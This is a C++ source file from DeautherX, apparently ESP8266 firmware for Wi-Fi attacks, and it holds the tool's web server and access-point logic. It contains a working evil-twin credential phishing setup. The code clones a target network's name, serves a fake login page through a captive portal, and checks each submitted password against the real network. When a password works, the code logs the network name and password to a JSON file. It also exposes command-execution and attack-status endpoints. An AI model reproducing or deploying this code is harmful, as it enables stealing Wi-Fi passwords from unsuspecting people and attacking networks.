/* This software is licensed under the MIT License: https://github.com/BlackTechX011/DeautherX */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>

#include "language.h"
#include "debug.h"
#include "settings.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "EvilTwin.h"

extern bool progmemToSpiffs(const char* adr, int len, String path);

#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;
String FILE_PATH = "eviltwin.html";

bool naptTry = false;
bool naptTy = false;
String naptStatus = "No set";

void save(bool force, String buffer) {
    if (!force) return;

    String buf = String();                              // create buffer
    buf = buffer;
    if (!writeFile(FILE_PATH, buf)) {
        prnt(F_ERROR_SAVING);
        prntln(FILE_PATH);
        return;
    }
    prnt(SS_SAVED_IN);
    prntln(FILE_PATH);
}

void save(bool force, String filepath, String buffer) {
    String tmp = FILE_PATH;

    FILE_PATH = filepath;
    save(force, buffer);
    FILE_PATH = tmp;
}
namespace wifi {
    // ===== PRIVATE ===== //
    wifi_mode_t   mode;
    ap_settings_t ap_settings;

    // Server and other global objects
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress    netmask(255, 255, 255, 0);

    int totalFileSize = 0;
    void setPath(String path) {
        if (path.charAt(0) != '/') {
            path = '/' + path;
        }

        if (path.length() > 32) {
            debuglnF("ERROR: Path longer than 32 characters");
        } else {
            strncpy(ap_settings.path, path.c_str(), 32);
        }
    }

    void setSSID(String ssid) {
        if (ssid.length() > 32) {
            debuglnF("ERROR: SSID longer than 32 characters");
        } else {
            strncpy(ap_settings.ssid, ssid.c_str(), 32);
        }
    }

    void setPassword(String password) {
        if (password.length() > 64) {
            debuglnF("ERROR: Password longer than 64 characters");
        } else if (password.length() < 8) {
            debuglnF("ERROR: Password must be at least 8 characters long");
        } else {
            strncpy(ap_settings.password, password.c_str(), 64);
        }
    }

    void setChannel(uint8_t ch) {
        if ((ch < 1) || (ch > 14)) {
            debuglnF("ERROR: Channel must be withing the range of 1-14");
        } else {
            ap_settings.channel = ch;
        }
    }

    void setHidden(bool hidden) {
        ap_settings.hidden = hidden;
    }

    void setCaptivePortal(bool captivePortal) {
        ap_settings.captive_portal = captivePortal;
    }

    void handleFileList() {
        if (!server.hasArg("dir")) {
            server.send(500, str(W_TXT), str(W_BAD_ARGS));
            return;
        }

        String path = server.arg("dir");
        // debugF("handleFileList: ");
        // debugln(path);

        Dir dir = LittleFS.openDir(path);

        String output = String('{'); // {
        File   entry;
        bool   first = true;

        while (dir.next()) {
            entry = dir.openFile("r");

            if (first) first = false;
            else output += ',';                 // ,

            output += '[';                      // [
            output += '"' + entry.name() + '"'; // "filename"
            output += ']';                      // ]

            entry.close();
        }

        output += CLOSE_BRACKET;
        server.send(200, str(W_JSON).c_str(), output);
    }

    String getContentType(String filename) {
        if (server.hasArg("download")) return String(F("application/octet-stream"));
        else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
        else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
        else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
        else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
        else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
        else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
        else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
        else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
        else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
        else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
        else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
        return str(W_TXT);
    }

    bool handleFileRead(String path) {
        // prnt(W_AP_REQUEST);
        // prnt(path);

        if (path.charAt(0) != '/') path = '/' + path;
        if (path.charAt(path.length() - 1) == '/') path += String(F("index.html"));

        String contentType = getContentType(path);

        if (!LittleFS.exists(path)) {
            if (LittleFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
            else if (LittleFS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
            else if (LittleFS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
            else {
                // prntln(W_NOT_FOUND);
                return false;
            }
        }

        File file = LittleFS.open(path, "r");

        server.streamFile(file, contentType);
        file.close();
        // prnt(SPACE);
        // prntln(W_OK);

        return true;
    }

    void sendProgmem(const char* ptr, size_t size, const char* type) {
        server.sendHeader("Content-Encoding", "gzip");
        server.sendHeader("Cache-Control", "max-age=3600");
        server.send(200, str(type).c_str(), ptr, size);
    }
    // ===== PUBLIC ====== //
    String getNaptStatus(){
        return naptStatus;
    }
    void begin() {
        // Set settings
        setPath("/web");
        setSSID(settings::getAccessPointSettings().ssid);
        setPassword(settings::getAccessPointSettings().password);
        setChannel(settings::getWifiSettings().channel);
        setHidden(settings::getAccessPointSettings().hidden);
        setCaptivePortal(settings::getWebSettings().captive_portal);

        // copy web files to SPIFFS
        if (settings::getWebSettings().use_spiffs) {
            copyWebFiles(false);
        }

        // Set mode
        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        wifi_set_opmode(STATION_MODE);

        // Set mac address
        wifi_set_macaddr(STATION_IF, (uint8_t*)settings::getWifiSettings().mac_st);
        wifi_set_macaddr(SOFTAP_IF, (uint8_t*)settings::getWifiSettings().mac_ap);
    }

    String getMode() {
        switch (mode) {
            case wifi_mode_t::off:
                return "OFF";
            case wifi_mode_t::ap:
                return "AP";
            case wifi_mode_t::st:
                return "ST";
            default:
                return String();
        }
    }

    void printStatus() {
        prnt(String(F("[WiFi] Path: '")));
        prnt(ap_settings.path);
        prnt(String(F("', Mode: '")));
        prnt(getMode());
        prnt(String(F("', SSID: '")));
        prnt(ap_settings.ssid);
        prnt(String(F("', password: '")));
        prnt(ap_settings.password);
        prnt(String(F("', channel: '")));
        prnt(ap_settings.channel);
        prnt(String(F("', hidden: ")));
        prnt(b2s(ap_settings.hidden));
        prnt(String(F(", captive-portal: ")));
        prntln(b2s(ap_settings.captive_portal));
    }

    void startNewAP(String path, String ssid, String password, uint8_t ch, bool hidden, bool captivePortal) {
        setPath(path);
        setSSID(ssid);
        setPassword(password);
        setChannel(ch);
        setHidden(hidden);
        setCaptivePortal(captivePortal);

        startAP();
    }
    void startEvilTwin(String apn){
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(apn);
    }
    /*
        void startAP(String path) {
            setPath(path):

            startAP();
        }
     */
    void initNapt(){
        err_t ret = ip_napt_init(NAPT, NAPT_PORT);
        naptStatus = "ip_napt_init("+String(NAPT)+","+String(NAPT_PORT)+"): ret=" + String(ret) + " (OK="+String(ERR_OK)+")";
        if (ret == ERR_OK) {
            ret = ip_napt_enable_no(SOFTAP_IF, 1);
            naptStatus = "ip_napt_enable_no(SOFTAP_IF): ret=" + String((int)ret) + " (OK=" + String((int)ERR_OK) + ")";
            if (ret == ERR_OK) {
                naptStatus = "WiFi Network started...";
            }
        }
        if (ret != ERR_OK) {
            naptStatus = "NAPT initialization failed";
        }
    }
    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.setOutputPower(20.5);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        if (naptTy){
            initNapt();
            naptTy = false;
        }
        wifi::startWebServer();
    }
    void connectHandler(){
        if (server.hasArg("ssid")) {
            sendProgmem(connectinghtml, sizeof(connectinghtml), W_HTML);
            delay(100);
            String ssid = server.arg("ssid");
            String pass = "";
            if (server.hasArg("pass")){
                pass = server.arg("pass");
            }
            String logConnect = "";
            stopAP();
            WiFi.mode(WIFI_STA);
            if (!pass.isEmpty()) {
                logConnect = ssid + "\n" + pass;
                WiFi.begin(ssid.c_str(), pass.c_str());
            }else{ 
                WiFi.begin(ssid.c_str());
                logConnect = ssid;
            }
            naptTry = true;
            writeFile("/accesspoint_repeater.txt", logConnect);
        }else{
            String html = "<html><body><h1>Masukkan informasi jaringan WiFi Tujuan:</h1>";
            html += "<form action=\"/connect\" method=\"GET\">";
            html += "SSID: <input type=\"text\" name=\"ssid\"><br>";
            html += "Password: <input type=\"password\" name=\"pass\"><br>";
            html += "<input type=\"submit\" value=\"Hubungkan\"></form></body></html>";
            server.send(200, "text/html", html);
        }
    }

    void sendEvilTwin(){
        String filePath = "";
        String content = "";
        
        if (readFile("/eviltwin.txt", filePath)){
            if (!filePath.isEmpty()){
                if (readFile(filePath, content)){
                    if (!content.isEmpty()){
                        server.send(200, W_HTML, content.c_str());
                    }else{
                        sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
                    }
                }else{
                    sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
                }
            }else{
                sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
            }
        }else{
            sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
        }
    }
    String bufferToString(const uint8_t* buffer, size_t size) {
        String result;
        for (size_t i = 0; i < size; ++i) {
            result += static_cast<char>(buffer[i]);
        }
        return result;
    }
    void removeAll(){
        if (LittleFS.format()){
            server.send(200,W_OK, W_OK);
            delay(500);
            ESP.reset();
        }else{
            server.send(200,W_OK, "FAILED");
        }
    }

    bool saveWiFiEvil(String ssid, String pass){
        String pathLocation = "/log.json";
        String lastBuffer = String();
        bool working = readFile(pathLocation, lastBuffer);
        if (working) {
            const char* empty = "";
            lastBuffer.replace(String(OPEN_BRACKET), String(empty));
            lastBuffer.replace(String(CLOSE_BRACKET), String(empty));
        }
        String tmp = String(OPEN_BRACKET);
        tmp += (!lastBuffer.isEmpty() ? lastBuffer + String(COMMA) : String("")) + 
            String(OPEN_CURLY_BRACKET) + 
                String(DOUBLEQUOTES) + "ssid" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + ssid + String(DOUBLEQUOTES) + String(COMMA) +
                String(DOUBLEQUOTES) + "pass" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + pass + String(DOUBLEQUOTES) +
            String(CLOSE_CURLY_BRACKET);
        tmp += String(CLOSE_BRACKET);
        
        if (working){
            String newBuffer = tmp;
            working = writeFile(pathLocation, newBuffer);
        }else{
            working = writeFile(pathLocation, tmp);
        }
        return working;
    }
    String fileCliList(){
        String tmp = String(OPEN_BRACKET);
        Dir rootDir = LittleFS.openDir("/");
        totalFileSize = 0;
        while (rootDir.next())
        {
            if (rootDir.isFile()){
                tmp += 
                String(OPEN_CURLY_BRACKET) + 
                    String(DOUBLEQUOTES) + "name" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + rootDir.fileName() + String(DOUBLEQUOTES) + String(COMMA) +
                    String(DOUBLEQUOTES) + "size" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + rootDir.fileSize() + String(DOUBLEQUOTES) +
                String(CLOSE_CURLY_BRACKET) + String(COMMA);
                totalFileSize += rootDir.fileSize();
            }
        }
        tmp = tmp.substring(0, tmp.length() - 1);
        tmp += String(CLOSE_BRACKET);
        return tmp;
    }

    void handleFileCli(){
        String command = server.arg("cmd");
        int cmdType = command == "listfile" ? 1 : 0;
        switch (cmdType)
        {
            case 1:
                server.send(200, W_JSON, fileCliList());
                break;
            
            default:
                if (removeFile(command)){
                    server.send(200, W_TXT, "OK");
                }else{
                    server.send(200, W_TXT, "FAILED");
                }
                break;
        }
    }
    void startWebServer(){
        dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", ip);
        MDNS.begin(WEB_URL);

        server.on("/list", HTTP_GET, handleFileList); // list directory
        server.on("/read", HTTP_GET, [](){
            if (!handleFileRead(server.arg("path"))){
                server.send(500, W_TXT, W_BAD_ARGS);
            }
        });

        fileCliList();

        #ifdef USE_PROGMEM_WEB_FILES
        // ================================================================
        // paste here the output of the webConverter.py
        if (!settings::getWebSettings().use_spiffs) {
            server.on("/fsinfo", HTTP_GET, [](){
                server.send(200, W_HTML, "Used : " + String(totalFileSize / 1024) + "k | Storage space : " + String((((1024*1024) * 2) - totalFileSize) / 1024) + "k");
            });
            server.on("/", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/index.html", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/wifistatus.txt", HTTP_GET, []() {
                if (WiFi.status() == WL_CONNECTED){
                    server.send(200, W_HTML, ("Connected To : " + WiFi.SSID()).c_str());
                }else{
                    server.send(200, W_HTML, "Failed to connect to WiFi. Timeout reached.");
                }
            });

            server.on("/pathsave", HTTP_GET, []() {
                String arg1 = server.arg("path");
                save(true, "/eviltwin.txt", arg1);
                
                String htmlResponse = "<html><body>";
                htmlResponse += "<script>alert('SUCCESS'); window.history.back();</script>";
                htmlResponse += "</body></html>";
                server.send(200, "text/html", htmlResponse);
            });
            
            server.on("/upload", HTTP_POST, []() {
                HTTPUpload& upload = server.upload();
                String fileName, content;

                fileName = "/" + upload.filename;
                content = bufferToString(upload.buf, upload.contentLength);
                if (writeFile(fileName, content)){
                    String htmlResponse = "<html><body>";
                    htmlResponse += "<script>alert('File upload finished: " + fileName + ", size: " + String(upload.contentLength) + "'); window.history.back();</script>";
                    htmlResponse += "</body></html>";
                    server.send(200, "text/html", htmlResponse);
                }else{
                    String htmlResponse = "<html><body>";
                    htmlResponse += "<script>alert('File upload failed!!!'); window.history.back();</script>";
                    htmlResponse += "</body></html>";
                    server.send(200, "text/html", htmlResponse);
                }

            });
            server.on("/filecli", HTTP_GET, handleFileCli);
            server.on("/format", HTTP_GET, removeAll);
            server.on("/eviltwin", HTTP_GET, []() {
                sendEvilTwin();
            });
            server.on("/scan.html", HTTP_GET, []() {
                sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
            });
            server.on("/info.html", HTTP_GET, []() {
                sendProgmem(infohtml, sizeof(infohtml), W_HTML);
            });
            server.on("/fsmanager.html", HTTP_GET, []() {
                sendProgmem(fsmanagerhtml, sizeof(fsmanagerhtml), W_HTML);
            });
            server.on("/ssids.html", HTTP_GET, []() {
                sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
            });
            server.on("/attack.html", HTTP_GET, []() {
                sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
            });
            server.on("/settings.html", HTTP_GET, []() {
                sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
            });
            server.on("/style.css", HTTP_GET, []() {
                sendProgmem(stylecss, sizeof(stylecss), W_CSS);
            });
            server.on("/js/ssids.js", HTTP_GET, []() {
                sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
            });
            server.on("/js/site.js", HTTP_GET, []() {
                sendProgmem(sitejs, sizeof(sitejs), W_JS);
            });
            server.on("/js/fs.js", HTTP_GET, []() {
                sendProgmem(fsjs, sizeof(fsjs), W_JS);
            });
            server.on("/js/attack.js", HTTP_GET, []() {
                sendProgmem(attackjs, sizeof(attackjs), W_JS);
            });
            server.on("/js/scan.js", HTTP_GET, []() {
                sendProgmem(scanjs, sizeof(scanjs), W_JS);
            });
            server.on("/js/settings.js", HTTP_GET, []() {
                sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
            });
            server.on("/lang/hu.lang", HTTP_GET, []() {
                sendProgmem(hulang, sizeof(hulang), W_JSON);
            });
            server.on("/lang/ja.lang", HTTP_GET, []() {
                sendProgmem(jalang, sizeof(jalang), W_JSON);
            });
            server.on("/lang/nl.lang", HTTP_GET, []() {
                sendProgmem(nllang, sizeof(nllang), W_JSON);
            });
            server.on("/lang/fi.lang", HTTP_GET, []() {
                sendProgmem(filang, sizeof(filang), W_JSON);
            });
            server.on("/lang/cn.lang", HTTP_GET, []() {
                sendProgmem(cnlang, sizeof(cnlang), W_JSON);
            });
            server.on("/lang/ru.lang", HTTP_GET, []() {
                sendProgmem(rulang, sizeof(rulang), W_JSON);
            });
            server.on("/lang/pl.lang", HTTP_GET, []() {
                sendProgmem(pllang, sizeof(pllang), W_JSON);
            });
            server.on("/lang/uk.lang", HTTP_GET, []() {
                sendProgmem(uklang, sizeof(uklang), W_JSON);
            });
            server.on("/lang/de.lang", HTTP_GET, []() {
                sendProgmem(delang, sizeof(delang), W_JSON);
            });
            server.on("/lang/it.lang", HTTP_GET, []() {
                sendProgmem(itlang, sizeof(itlang), W_JSON);
            });
            server.on("/lang/en.lang", HTTP_GET, []() {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            });
            server.on("/lang/fr.lang", HTTP_GET, []() {
                sendProgmem(frlang, sizeof(frlang), W_JSON);
            });
            server.on("/lang/in.lang", HTTP_GET, []() {
                sendProgmem(inlang, sizeof(inlang), W_JSON);
            });
            server.on("/lang/ko.lang", HTTP_GET, []() {
                sendProgmem(kolang, sizeof(kolang), W_JSON);
            });
            server.on("/lang/ro.lang", HTTP_GET, []() {
                sendProgmem(rolang, sizeof(rolang), W_JSON);
            });
            server.on("/lang/da.lang", HTTP_GET, []() {
                sendProgmem(dalang, sizeof(dalang), W_JSON);
            });
            server.on("/lang/ptbr.lang", HTTP_GET, []() {
                sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
            });
            server.on("/lang/cs.lang", HTTP_GET, []() {
                sendProgmem(cslang, sizeof(cslang), W_JSON);
            });
            server.on("/lang/tlh.lang", HTTP_GET, []() {
                sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
            });
            server.on("/lang/es.lang", HTTP_GET, []() {
                sendProgmem(eslang, sizeof(eslang), W_JSON);
            });
            server.on("/lang/th.lang", HTTP_GET, []() {
                sendProgmem(thlang, sizeof(thlang), W_JSON);
            });
        }
        server.on("/lang/default.lang", HTTP_GET, []() {
            if (!settings::getWebSettings().use_spiffs) {
                if (String(settings::getWebSettings().lang) == "hu") sendProgmem(hulang, sizeof(hulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ja") sendProgmem(jalang, sizeof(jalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "nl") sendProgmem(nllang, sizeof(nllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fi") sendProgmem(filang, sizeof(filang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cn") sendProgmem(cnlang, sizeof(cnlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ru") sendProgmem(rulang, sizeof(rulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "pl") sendProgmem(pllang, sizeof(pllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "uk") sendProgmem(uklang, sizeof(uklang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "de") sendProgmem(delang, sizeof(delang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "it") sendProgmem(itlang, sizeof(itlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "en") sendProgmem(enlang, sizeof(enlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fr") sendProgmem(frlang, sizeof(frlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "in") sendProgmem(inlang, sizeof(inlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ko") sendProgmem(kolang, sizeof(kolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ro") sendProgmem(rolang, sizeof(rolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "da") sendProgmem(dalang, sizeof(dalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ptbr") sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cs") sendProgmem(cslang, sizeof(cslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "tlh") sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "es") sendProgmem(eslang, sizeof(eslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "th") sendProgmem(thlang, sizeof(thlang), W_JSON);

                else handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            } else {
                handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            }
        });
        // ================================================================
        #endif /* ifdef USE_PROGMEM_WEB_FILES */

        server.on("/run", HTTP_GET, []() {
            server.send(200, str(W_TXT), str(W_OK).c_str());
            String input = server.arg("cmd");
            cli.exec(input);
        });
        

        server.on("/attack.json", HTTP_GET, []() {
            server.send(200, str(W_JSON), attack.getStatusJSON());
        });
        server.on("/connect", HTTP_GET, connectHandler);

        server.on("/submit", HTTP_GET, []() {
            if (EvilTwin::isRunning()){
                String pass = server.arg("password");
                Serial.println("["+EvilTwin::ssidT+"] Connecting PASS '" + pass.c_str() + "'");
                WiFi.begin(EvilTwin::ssidT, pass);
                EvilTwin::passTesting = pass;
                sendProgmem(connectinghtml, sizeof(connectinghtml), W_HTML);
            }else{
                server.send(404, W_TXT, W_FILE_NOT_FOUND);
            }
        });

        // called when the url is not defined here
        // use it to load content from SPIFFS
        server.onNotFound([]() {
            if (!handleFileRead(server.uri())) {
                if (settings::getWebSettings().captive_portal || EvilTwin::isRunning()){
                    if (EvilTwin::isRunning()){
                        sendEvilTwin();
                    }else{
                        sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                    }
                }
                else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;

        prntln(W_STARTED_AP);
        printStatus();
    }
    
    void stopAP() {
        if (mode == wifi_mode_t::ap) {
            wifi_promiscuous_enable(0);
            WiFi.persistent(false);
            WiFi.disconnect(true);
            wifi_set_opmode(STATION_MODE);
            prntln(W_STOPPED_AP);
            mode = wifi_mode_t::st;
        }
    }

    void resumeAP() {
        if (mode != wifi_mode_t::ap) {
            mode = wifi_mode_t::ap;
            wifi_promiscuous_enable(0);
            WiFi.softAPConfig(ip, ip, netmask);
            WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
            prntln(W_STARTED_AP);
        }
    }
    void update() {
        if ((mode != wifi_mode_t::off) && !scan.isScanning()) {
            server.handleClient();
            dns.processNextRequest();
        }
        if (WiFi.status() == WL_CONNECTED && EvilTwin::isRunning()){
            EvilTwin::pass = EvilTwin::passTesting;
            EvilTwin::stop();
            attack.stop();
            saveWiFiEvil(EvilTwin::ssidT, EvilTwin::getpass());
        } else if (WiFi.status() == WL_CONNECTED && naptTry)
        {
            dhcps_set_dns(0, WiFi.dnsIP(0));
            dhcps_set_dns(1, WiFi.dnsIP(1));
            naptTy = true;
            startAP();
            naptTry = false;
        }
        
    }
}